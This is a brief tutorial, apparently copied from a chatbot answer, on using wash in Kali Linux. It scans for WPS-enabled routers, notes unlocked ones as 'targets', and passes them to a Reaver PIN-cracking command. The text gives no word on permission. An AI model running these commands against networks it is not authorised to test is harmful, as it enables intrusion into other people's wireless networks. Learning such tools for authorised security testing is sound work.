‚úÖ What Wash Does
Detects WPS-enabled networks.

Shows BSSID, Channel, Signal strength, and WPS Lock status.

Helps identify targets for WPS PIN attacks (via Reaver or Bully).

üîß Step-by-Step: Using wash in Kali Linux
Step 1: Put Wi-Fi Adapter into Monitor Mode
bash
Copy
Edit
airmon-ng start wlan0
Replace wlan0 with your adapter‚Äôs name (use iwconfig to check).

This will create a new interface, usually wlan0mon.

Step 2: Start Wash
bash
Copy
Edit
wash -i wlan0mon
-i specifies the interface.

You‚Äôll see nearby WPS-enabled routers listed.

Optional Flags:
bash
Copy
Edit
wash -i wlan0mon -c 6         # Scan only on channel 6
wash -i wlan0mon -s           # Use short output (less detail)
wash -i wlan0mon -g           # Include graph-style signal
Step 3: Identify a Target
Look for targets with WPS Locked: No.

Note down the BSSID and channel for use in Reaver.

Step 4: Stop Monitor Mode (Optional)
bash
Copy
Edit
airmon-ng stop wlan0mon
‚ö†Ô∏è Tips:
If no APs show, try:

bash
Copy
Edit
rfkill unblock all
ifconfig wlan0mon up
Make sure your Wi-Fi adapter supports monitor mode and packet injection.

üìå Example Use with Reaver (after Wash)
bash
Copy
Edit
reaver -i wlan0mon -b [BSSID] -c [channel] -vv
